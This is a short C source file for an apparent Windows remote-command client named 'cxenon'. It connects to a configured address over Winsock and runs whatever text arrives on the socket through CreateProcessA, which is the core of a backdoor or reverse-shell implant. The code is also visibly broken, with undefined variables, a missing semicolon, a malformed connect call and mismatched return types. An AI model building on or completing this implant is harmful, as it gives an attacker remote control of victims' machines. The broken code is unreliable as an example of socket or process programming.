#include "cxenon.h"

int WININIT(void)
{

#if defined(_WIN32)

	WSADATA wsa;
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		fprintf(stderr, "\n\afailed to initilize ws2_32.dll");
		return Exit;
	}

	return 0;

#else
	return 0;

#endif
	return UNKNOWN;
	
}


pClientCTX CliInit(void)
{

	pClientCTX CTX = malloc(sizeof(ClientCTX));
	if (CTX == NULL) { return Exit; }

	CTX->dstport = 80;
	CTX->dstaddr = "127.0.0.1";

	return CTX;

}

SOCKET client_socket(SOCKET Socket)
{

	Socket = socket(AF_INET, SOCK_STREAM, 0);
	if(Socket == INVALID_SOCKET)
	{
		fprintf(stderr, "\nfailed to create a socket %d", WSAGetLastError());
		free(CTX);
		WSACleanup();
		return Exit;
	}
	
	return Socket

}

SOCKET client_conn(SOCKET Socket, pClientCTX CTX)
{

	if (connect(Socket, CTX->dstaddr, (int)sizeof(CTX->dstaddr)) != 0)
	{

		fprintf(stderr, "\n\afailed to connect to target %d.", WSAGetLastError());
		closesocket(Socket);
		free(CTX);
		WSACleanup();

		return Exit;

	}

	free(CTX);
	return Socket;

}

int execmd(SOCKET Socket)
{

	char rbuff[1024];
	char sbuff[1024];

	STARTUPINFO SINFO;
	PROCESS_INFORMATION PINFO;

	while (1)
	{

		int recvb = recv(Socket, buff, sizeof(rbuff)-1, 0);
		if (recb == 0)
		{
			Sleep(500);
			break;
			return Exit;
		}

		if (bytes == SOCKET_ERROR)
		{
			printf("recv failed: %d\n", WSAGetLastError());
			break;
		}

		rbuff[recvb] = '\0';

		if (CreateProcessA(
			NULL,
			rbuff,
			NULL,
			NULL,
			False,
			0,
			NULL,
			NULL,
			&SINFO,
			&PINFO
		) > 0)
		{
			printf("\nexecuted command");
		}

		fprintf(stderr, "failed to execute commad %d", GetLastError());

		return 0;

	}

}
